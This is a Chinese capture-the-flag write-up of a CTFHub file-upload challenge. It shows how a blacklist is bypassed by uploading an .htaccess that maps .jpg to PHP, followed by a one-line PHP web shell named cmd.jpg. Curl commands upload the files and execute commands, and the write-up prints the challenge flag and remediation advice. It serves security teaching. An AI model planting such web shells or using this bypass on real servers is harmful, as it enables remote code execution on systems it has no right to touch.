CTFHub - Web - 文件上传 - .htaccess

# CTFHub # Web # 文件上传 # .htaccess # RCE

一、题目信息

  • 题目名称：文件上传 - .htaccess
  • 题目方向：Web - 文件上传
  • 运行环境：Apache 2.4.38 / PHP 7.3.14
  • 题目目标：利用 Apache 配置文件解析规则绕过黑名单，获取服务器权限并读取 Flag。

二、漏洞分析

首页源码中的后端逻辑只按上传文件名后缀进行黑名单检查，拦截了 php、php5、phtml、jsp 等后缀，但没有禁止 .htaccess。上传文件会保留原始文件名并写入 Web 根目录下的 upload/。

该目录运行在 Apache 中且允许 .htaccess 生效，因此可以先上传配置文件，将 .jpg 扩展名交给 PHP 处理器，再上传一个后缀为 .jpg 的 PHP Payload。这样既绕过了扩展名黑名单，也能通过 Web 访问触发代码执行。

$ext = pathinfo($name)['extension'];
$blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", ...);
if (!in_array($ext, $blacklist)) {
    move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name);
}

三、解题步骤

  1. 构造 .htaccess：添加一条 AddType 指令，使目标目录中的 .jpg 文件按 PHP 解析。 
    AddType application/x-httpd-php .jpg
  2. 上传 .htaccess：黑名单未覆盖无普通扩展名的配置文件，提交后返回路径 upload/.htaccess。 
    curl -F "submit=Submit" \
  -F "file=@.htaccess;filename=.htaccess;type=text/plain" \
  "http://<challenge-host>:10800/"
  3. 构造 PHP Payload：将命令执行代码命名为 cmd.jpg，通过 c 参数控制待执行命令。 
    <?php
header("Content-Type: text/plain; charset=UTF-8");
system($_GET["c"]);
?>
  4. 上传 Payload 并验证：上传成功后返回 upload/cmd.jpg。访问该文件，确认服务端以 www-data 身份执行命令。 
    curl -F "submit=Submit" \
  -F "file=@cmd.jpg;filename=cmd.jpg;type=image/jpeg" \
  "http://<challenge-host>:10800/"

curl --get \
  --data-urlencode "c=id; pwd" \
  "http://<challenge-host>:10800/upload/cmd.jpg"
  5. 定位 Flag：列出 Web 目录中的文件，发现题目动态生成的 PHP 文件。 
    find /var/www -maxdepth 5 -type f -printf "%p\n" 2>/dev/null
    /var/www/html/flag_2410013318.php
  6. 读取源码：直接访问 PHP 文件不会显示注释内容，使用已获得的命令执行能力读取其源代码。 
    cat /var/www/html/flag_2410013318.php
    <?php // ctfhub{0eca758368aad652907dd246}

四、最终 Flag

ctfhub{0eca758368aad652907dd246}

五、修复建议

  • 禁止配置文件上传：服务端应对文件名做严格白名单，显式拒绝 .htaccess、.user.ini 等控制文件。
  • 禁止覆盖解析规则：上传目录关闭 AllowOverride，或使用 <Directory> 配置禁止修改 PHP 处理器。
  • 重命名存储：由服务端生成随机文件名和固定安全扩展名，不能保留用户控制的文件名。
  • 隔离上传目录：将文件存放在 Web 根目录之外，并关闭该目录的脚本执行权限。
  • 校验文件内容：结合真实文件头和 MIME 类型进行校验，同时保持 Web 服务最小权限。
